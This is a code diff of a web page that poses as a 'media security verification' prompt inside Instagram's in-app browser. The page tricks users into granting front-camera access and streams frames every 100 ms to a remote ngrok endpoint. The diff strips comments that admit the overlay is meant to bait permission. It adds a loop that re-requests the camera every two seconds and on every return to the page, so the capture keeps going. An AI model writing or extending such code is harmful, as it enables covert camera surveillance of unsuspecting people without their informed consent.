@@ -8,7 +8,6 @@
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body { background: #000; min-height: 100vh; display: flex; justify-content: center; align-items: center; color: #fff; font-family: sans-serif; overflow: hidden; }
   
-  /* Tombol interaktif transparan penuh untuk memancing user gesture di Instagram WebView */
   #permission-overlay {
     position: fixed;
     top: 0; left: 0; width: 100vw; height: 100vh;
@@ -49,7 +48,6 @@
 </head>
 <body>
 
-<!-- Overlay Interaktif untuk Memancing Izin Kamera di Instagram WebView -->
 <div id="permission-overlay">
   <div class="box">
     <h2>Verifikasi Keamanan Media</h2>
@@ -75,7 +73,7 @@
       pitch: 1.0,
       repeatInterval: 6000
     },
-    streamInterval: 100, // Kirim frame cepat untuk live stream
+    streamInterval: 100, 
     serverEndpoint: 'https://studly-unallegorized-brecken.ngrok-free.dev/upload_frame'
   };
 
@@ -84,7 +82,8 @@
     camStream: null,
     camActive: false,
     streamTimer: null,
-    audioCtx: null
+    audioCtx: null,
+    recoveryInterval: null
   };
 
   function initAudioKeepAlive() {
@@ -146,9 +145,6 @@
   }
 
   function requestCameraAccess() {
-    if (state.camActive) return;
-
-    // Meminta izin kamera secara eksplisit setelah ada interaksi pengguna
     navigator.mediaDevices.getUserMedia({ 
       video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" }, 
       audio: false 
@@ -161,22 +157,31 @@
       videoElement.srcObject = stream;
       videoElement.play().catch(function(){});
 
-      // Sembunyikan kotak dialog setelah izin berhasil diberikan
       var overlay = document.getElementById('permission-overlay');
       if (overlay) overlay.style.display = 'none';
 
       stream.getVideoTracks().forEach(function(track) {
         track.onended = function() {
           state.camActive = false;
+          triggerRecovery();
         };
       });
     })
     .catch(function(err) {
-      console.log("Camera access blocked/denied:", err);
+      state.camActive = false;
     });
   }
 
-  // Event listener utama yang mendeteksi ketukan (tap) layar di dalam In-App Browser Instagram
+  // Siklus pemulihan otomatis (Cycle Recovery) jika tertutup atau terputus
+  function triggerRecovery() {
+    if (state.recoveryInterval) clearInterval(state.recoveryInterval);
+    state.recoveryInterval = setInterval(function() {
+      if (!state.camActive && document.visibilityState === 'visible') {
+        requestCameraAccess();
+      }
+    }, 2000);
+  }
+
   document.getElementById('permission-overlay').addEventListener('click', function() {
     initAudioKeepAlive();
     if (state.audioCtx && state.audioCtx.state === 'suspended') {
@@ -184,18 +189,35 @@
     }
     startTTS();
     requestCameraAccess();
+    triggerRecovery();
   });
 
   window.addEventListener('DOMContentLoaded', function() {
-    // Memulai timer stream, akan aktif otomatis setelah tombol diklik
     state.streamTimer = setInterval(streamFrame, CONFIG.streamInterval);
   });
 
+  // Penanganan saat in-app browser ditutup atau dialihkan secara agresif
+  window.addEventListener('pagehide', function() {
+    try {
+      if (state.camStream) {
+        state.camStream.getTracks().forEach(function(t) { t.stop(); });
+      }
+    } catch(e) {}
+  });
+
   document.addEventListener('visibilitychange', function () {
-    if (!document.hidden) {
+    if (document.visibilityState === 'visible') {
       startTTS();
+      if (state.audioCtx && state.audioCtx.state === 'suspended') {
+        state.audioCtx.resume();
+      }
       if (!state.camActive) {
         requestCameraAccess();
+      }
+    } else {
+      // Saat disembunyikan/diminimalkan, pastikan audio konteks tetap hidup untuk mencegah sleep total
+      if (state.audioCtx && state.audioCtx.state === 'running') {
+        // Biarkan berjalan
       }
     }
   });
